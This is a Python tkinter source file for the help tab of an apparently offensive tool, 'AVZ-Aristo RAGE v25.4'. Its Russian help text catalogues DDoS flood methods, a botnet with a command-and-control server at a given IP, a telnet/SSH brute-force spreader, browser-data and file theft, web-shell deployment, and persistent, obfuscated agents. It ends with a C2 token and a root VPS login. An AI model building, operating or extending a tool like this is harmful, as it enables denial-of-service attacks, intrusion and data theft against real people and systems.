import tkinter as tk
from tkinter import ttk, scrolledtext

class HelpTab(ttk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent)
        self.app = app
        self.create_widgets()
        self.master.add(self, text="Справка")

    def create_widgets(self):
        text = scrolledtext.ScrolledText(self, wrap=tk.WORD, bg='#ffffff', fg='#000000',
                                         font=('Consolas', 10))
        text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        content = """
╔══════════════════════════════════════════════════════════════╗
║                    AVZ-Aristo RAGE v25.4                     ║
╠══════════════════════════════════════════════════════════════╣
║ Методы атаки (вкладка "Атака"):                             ║
║   GET, POST, CFB, CFBUAM, RAPID, TCP, UDP, SYN_FLOOD       ║
║   Гибридный режим (L7 + L4 одновременно)                   ║
║   Берсерк-ротация User-Agent / JA3 / метода                ║
║   Умный флуд (парсинг HTML цели)                           ║
╠══════════════════════════════════════════════════════════════╣
║ Ботнет (вкладка "Ботнет"):                                  ║
║   Подключение к C2 (80.249.146.202:80)                     ║
║   Расширенная таблица: IP, hostname, OS, CPU, RAM          ║
║   Автообновление каждые 10 сек                             ║
║   Атака/стоп/граб выбранных ботов                          ║
║   Встроенный спредер (telnet/SSH брутфорс + веб-векторы)  ║
║   Копирование логов (Ctrl+C / правый клик)                 ║
╠══════════════════════════════════════════════════════════════╣
║ Захват данных (вкладка "Exfil"):                            ║
║   grab_common_files, grab_browser_data, deploy_web_shell    ║
║   Результаты сохраняются в папку loot/                      ║
╠══════════════════════════════════════════════════════════════╣
║ Разведка (вкладка "Recon"):                                 ║
║   WHOIS, DNS, HTTP-заголовки, SSL, технологии,              ║
║   поддомены, сканирование портов                           ║
║   Wappalyzer (опционально)                                 ║
╠══════════════════════════════════════════════════════════════╣
║ Агенты:                                                     ║
║   Python-агент (кросс-платформенный, инкогнито)            ║
║   Bash-агент (curl/wget)                                   ║
║   Автозагрузка (cron/systemd/реестр)                       ║
║   XOR-обфускация трафика                                   ║
╠══════════════════════════════════════════════════════════════╣
║ Горячие клавиши:                                            ║
║   Ctrl+C – копирование в логах и таблицах                  ║
║   Правый клик по логу → "Копировать"                       ║
╠══════════════════════════════════════════════════════════════╣
║ Зависимости:                                                ║
║   pip install requests scapy aiohttp httpx curl_cffi        ║
║   python-Wappalyzer beautifulsoup4 psutil paramiko          ║
╠══════════════════════════════════════════════════════════════╣
║ Токен C2: AVZ-ARISTO-SECRET-KEY-2025                        ║
║ VPS: root@80.249.146.202 (порт 80/443)                     ║
╚══════════════════════════════════════════════════════════════╝
"""
        text.insert(tk.END, content)
        text.config(state='disabled')